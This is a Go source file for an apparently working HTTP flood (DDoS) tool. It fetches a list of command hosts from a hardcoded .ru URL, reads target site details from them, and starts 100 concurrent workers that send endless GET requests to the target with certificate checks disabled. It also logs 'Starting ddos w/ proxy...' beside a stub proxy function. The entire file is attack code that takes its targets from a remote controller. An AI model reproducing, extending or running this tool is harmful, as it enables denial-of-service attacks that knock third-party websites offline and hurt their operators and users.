package main

import (
	"crypto/tls"
	"encoding/json"
	"log"
	"math/rand"
	"net/http"
	"net/url"
	"runtime"
	"sync/atomic"
	"time"
)

var client *http.Client
var TotalRequstSent int64 = 0
var SuccessRequestSent int64 = 0

const HOST_AGGREGATOR = "http://rockstarbloggers.ru/hosts.json"
const NUM_OF_WORKERS int = 100

type Proxy []struct {
	ID   int    `json:"id"`
	IP   string `json:"ip"`
	Auth string `json:"auth"`
}

type HostResp struct {
	Site struct {
		ID           int    `json:"id"`
		URL          string `json:"url"`
		NeedParseURL int    `json:"need_parse_url"`
		PageTime     string `json:"page_time"`
		Attack       int    `json:"atack"`
	}

	Proxy
}

func GetHost() (string, error) {
	resp, err := client.Get(HOST_AGGREGATOR)
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()

	dec := json.NewDecoder(resp.Body)
	var hosts []string
	if err := dec.Decode(&hosts); err != nil {
		return "", err
	}

	return hosts[rand.Intn(len(hosts)-1)], nil
}

func GetDataFromHost(host string) (*HostResp, error) {
	resp, err := client.Get(host)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()

	dec := json.NewDecoder(resp.Body)
	hostResp := new(HostResp)
	if err := dec.Decode(hostResp); err != nil {
		return nil, err
	}

	return hostResp, err
}

func SendWithProxy(targetURL string, proxy Proxy) error {
	return nil
}

func StartHTTPWorkers(done <-chan struct{}, workersNum int, targetURL string) {
	for i := 0; i < workersNum; i++ {
		go func() {
			for {
				select {
				case <-done:
					return
				default:
					resp, err := client.Get(targetURL)
					atomic.AddInt64(&TotalRequstSent, 1)
					if err == nil {
						log.Println(resp.StatusCode)
						atomic.AddInt64(&SuccessRequestSent, 1)
						resp.Body.Close()
					}
				}
				runtime.Gosched()
			}
		}()
	}
}

func init() {
	// Setup
	rand.Seed(time.Now().UnixNano())
	tr := http.DefaultTransport.(*http.Transport).Clone()
	tr.TLSClientConfig = &tls.Config{InsecureSkipVerify: true}
	tr.IdleConnTimeout = time.Second * 10

	client = &http.Client{Transport: tr}
}

func main() {
	for i := 0; true; i++ {
		if i != 0 {
			// Sleep after first failed attempt
			time.Sleep(time.Second * 5)
		}

		host, err := GetHost()
		if err != nil {
			log.Printf("on getting hosts: %v\n", err)
			continue
		}
		log.Printf("Using the host: %s\n", host)

		data, err := GetDataFromHost(host)

		if err != nil {
			log.Printf("on parsing data from host: %v\n", err)
			continue
		}

		// log.Println(data)

		_, err = url.ParseRequestURI(data.Site.URL)
		if err != nil {
			log.Printf("on parsing a target URL: %v\n", err)
			continue
		}

		resp, err := client.Get(data.Site.URL)
		if err != nil {
			log.Printf("on sending to a target URL: %v\n", err)
			continue
		}
		resp.Body.Close()

		if resp.StatusCode != http.StatusOK {
			log.Println("Starting ddos w/ proxy...")
			// Send the requst through proxies
			// err := SendWithProxy(target)
			continue
		}

		done := make(chan struct{}, 1)
		StartHTTPWorkers(done, NUM_OF_WORKERS, data.Site.URL)
	}
}
